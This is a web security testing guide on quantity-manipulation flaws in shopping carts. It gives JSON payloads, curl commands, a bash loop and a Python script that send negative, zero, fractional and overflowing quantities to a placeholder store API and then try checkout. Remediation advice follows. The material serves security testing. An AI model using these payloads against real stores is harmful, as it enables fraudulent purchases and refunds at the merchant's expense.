# Quantity Manipulation (Negative, Zero, Overflow)

## Overview
Quantity manipulation vulnerabilities arise when applications process quantity values supplied by the client without adequate server-side validation of allowable ranges. Attackers can submit negative quantities, zero quantities, fractional values, or extremely large values to trigger unintended financial calculations, bypass stock checks, or cause integer overflow conditions. These attacks can result in products being purchased for negative cost, free items being added to carts, or arithmetic overflow causing price totals to wrap around to zero or negative values.

## How It Works
Applications typically pass quantities in HTTP request parameters, JSON bodies, or hidden form fields. When the server calculates the line total as `price × quantity` without validating `quantity > 0`, several attack paths open:

1. **Negative quantity:** `quantity = -1` causes the line total to become `-99.99`. When summed with other items, the total decreases. If the server accepts negative totals as credits or allows checkout with a negative total, the attacker receives goods and money back.

2. **Zero quantity:** `quantity = 0` results in a zero cost for that line. The server may still ship the item if it processes the cart items by ID rather than by cost.

3. **Fractional quantity:** `quantity = 0.001` on a $100 item = $0.10 total. Some servers round down or truncate the quantity without rejecting non-integer values.

4. **Overflow:** Extremely large quantities (e.g., `quantity = 9999999999999999`) can cause 32-bit or 64-bit integer overflow, wrapping the price total to zero or a negative value. In Python, integers are unbounded, but databases, Java `int`, and C `int` (32-bit) overflow at 2,147,483,647.

5. **Floating-point exploitation:** Values like `quantity = 1e308` may cause floating-point infinity or NaN (Not a Number), which some servers mishandle by treating the total as zero or skipping the line.

6. **Stock bypass:** Setting quantity to a value greater than available stock (e.g., `quantity = 1000` when only 3 are in stock) tests whether inventory checks are properly enforced server-side.

## Impact
- Purchasing items for free (zero or negative totals).
- Generating store credits or refunds fraudulently via negative quantity.
- Bypassing stock/inventory limits to reserve more items than available.
- Crashing or causing undefined behavior in server arithmetic (integer overflow leading to DoS or data corruption).
- Floating-point NaN/Infinity causing checkout to succeed with $0 total.
- Abusing quantity rounding to purchase items at fractions of intended cost.

## Where to Look
- Cart update requests: `POST /cart/update`, `PUT /cart/items/:id`.
- Checkout requests with item line details.
- API endpoints: `POST /api/orders`, `PUT /api/cart`.
- Any JSON or form field named `quantity`, `qty`, `count`, `amount`, `units`, `num`.
- Stock reservation APIs used before payment.
- Subscription/seat management: quantity of user seats in SaaS apps.
- Point redemption: `points_to_redeem` field.

## Testing Steps
1. Add an item to the cart and capture the cart update or checkout POST request.
2. Identify the quantity parameter in the request.
3. In Burp Repeater, test each of the following values systematically and observe the server response and any resulting totals.
4. Check if the server returns an error or silently accepts invalid quantities.
5. Attempt to complete checkout after each manipulation — check if an order is created at an unexpected price.
6. Test for integer overflow: submit `quantity = 2147483648` (INT_MAX + 1) and `quantity = 9223372036854775808` (LONG_MAX + 1).
7. Check the order confirmation and any resulting invoice to see what price was actually charged.
8. Test `quantity = null` and `quantity = ""` to probe for null-handling bugs.
9. Test `quantity = 1.5` or `quantity = 0.5` for fractional acceptance.
10. If quantity affects stock levels, check the inventory count after setting a large quantity — does stock go negative?

## Payloads / Techniques

```http
# Standard cart update request (captured baseline)
POST /api/cart/update HTTP/1.1
Host: target.example.com
Content-Type: application/json
Cookie: session=abc123

{"item_id": "PROD-001", "quantity": 1}

# ===== MANIPULATION PAYLOADS =====

# Negative quantity
{"item_id": "PROD-001", "quantity": -1}

# Large negative
{"item_id": "PROD-001", "quantity": -9999}

# Zero
{"item_id": "PROD-001", "quantity": 0}

# Fractional
{"item_id": "PROD-001", "quantity": 0.001}
{"item_id": "PROD-001", "quantity": 0.5}

# 32-bit integer max + 1 (overflow for int32)
{"item_id": "PROD-001", "quantity": 2147483648}

# 64-bit integer max + 1 (overflow for int64/long)
{"item_id": "PROD-001", "quantity": 9223372036854775808}

# Floating-point overflow (Infinity)
{"item_id": "PROD-001", "quantity": 1e308}
{"item_id": "PROD-001", "quantity": 1.7976931348623157e+308}

# NaN (Not a Number)
{"item_id": "PROD-001", "quantity": "NaN"}

# Null
{"item_id": "PROD-001", "quantity": null}

# Empty string
{"item_id": "PROD-001", "quantity": ""}

# Very small float
{"item_id": "PROD-001", "quantity": 1e-10}

# Stock overflow (more than available)
{"item_id": "PROD-001", "quantity": 999999}

# Negative with extra large value (underflow)
{"item_id": "PROD-001", "quantity": -2147483648}
```

```bash
# Test negative quantity via curl
curl -s -X POST https://target.example.com/api/cart/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"item_id": "PROD-001", "quantity": -1}'

# Test zero quantity
curl -s -X POST https://target.example.com/api/cart/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"item_id": "PROD-001", "quantity": 0}'

# Test integer overflow
curl -s -X POST https://target.example.com/api/cart/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"item_id": "PROD-001", "quantity": 2147483648}'

# Test NaN
curl -s -X POST https://target.example.com/api/cart/update \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"item_id": "PROD-001", "quantity": "NaN"}'

# Batch test multiple quantities
for qty in -1 -999 0 0.001 0.5 2147483648 9999999999 1e308 NaN null; do
  echo -n "Quantity=$qty: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.example.com/api/cart/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION" \
    -d "{\"item_id\": \"PROD-001\", \"quantity\": $qty}"
  echo
done
```

```python
# Automated quantity manipulation test
import requests

BASE_URL = "https://target.example.com"
SESSION = "your_session_cookie_value"
ITEM_ID = "PROD-001"

test_quantities = [
    -1, -100, -2147483648, -9223372036854775808,
    0, 0.001, 0.5, 1.5,
    2147483647, 2147483648, 9223372036854775807, 9223372036854775808,
    1e308, 1e-10, float('inf'), float('nan'),
    999999, 1000000,
    None,
]

def update_cart(quantity):
    try:
        r = requests.post(
            f"{BASE_URL}/api/cart/update",
            json={"item_id": ITEM_ID, "quantity": quantity},
            cookies={"session": SESSION},
            timeout=5
        )
        total = None
        try:
            data = r.json()
            total = data.get("total") or data.get("grand_total") or data.get("line_total")
        except Exception:
            pass
        return r.status_code, total, r.text[:100]
    except Exception as e:
        return 0, None, str(e)

for qty in test_quantities:
    status, total, preview = update_cart(qty)
    flag = " <-- POTENTIAL ISSUE" if (status in [200, 201] and total is not None and total <= 0) else ""
    print(f"qty={qty}: HTTP {status}, total={total}{flag}")

# Check if checkout succeeds with the manipulated cart
def attempt_checkout():
    r = requests.post(
        f"{BASE_URL}/api/checkout",
        json={"payment_method": "test_card"},
        cookies={"session": SESSION}
    )
    return r.status_code, r.text[:200]

print("\nAttempting checkout with current cart state:")
print(attempt_checkout())
```

## Burp Suite Tips
- Send the cart update request to **Repeater** and test each payload value from the list above. Observe the calculated total in the response after each change.
- Use **Intruder** in Sniper mode against the quantity field with a Number payload: set the range from -1 to -100 to test negative quantities systematically, then separately test large values.
- In **Proxy > Match and Replace**, create a rule to replace `"quantity":1` with `"quantity":-1` in all outgoing requests to passively test quantity manipulation across the entire application flow.
- Check the **Response > Render** tab in Repeater after submitting a manipulated cart update to see if the shopping cart UI reflects the manipulated total.
- Use **Comparer** to diff the response body from `quantity=1` vs. `quantity=-1` — the difference in the total field confirms whether the server is recalculating.
- After manipulating the cart, capture and replay the full checkout sequence through Repeater to confirm the order is accepted at the manipulated price.

## Tools
- Burp Suite (Repeater, Intruder, Proxy)
- curl / httpie (quick manual tests)
- Python requests (automated batch testing)
- OWASP ZAP
- Postman

## Remediation
- Validate on the server that quantity is an integer greater than zero: `if quantity <= 0 or not isinstance(quantity, int): reject`.
- Enforce a maximum quantity per item per order (e.g., 100 or based on stock).
- Re-validate quantity against current stock levels at checkout time, not just at add-to-cart time.
- Use strongly typed integer fields in API schemas — reject fractional, NaN, Infinity, null, or string values.
- Calculate all totals server-side using validated quantities × authoritative prices from the database.
- Apply database-level constraints: `CHECK (quantity > 0 AND quantity <= 10000)`.
- Log and alert on orders with unusual quantity values (very high quantities, decimals if not supported).
- For SaaS seat management: validate seat counts against the subscription plan's entitlement server-side.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
https://portswigger.net/web-security/logic-flaws/examples
https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html
https://owasp.org/www-community/attacks/Web_Parameter_Tampering
https://cwe.mitre.org/data/definitions/190.html
https://cwe.mitre.org/data/definitions/191.html
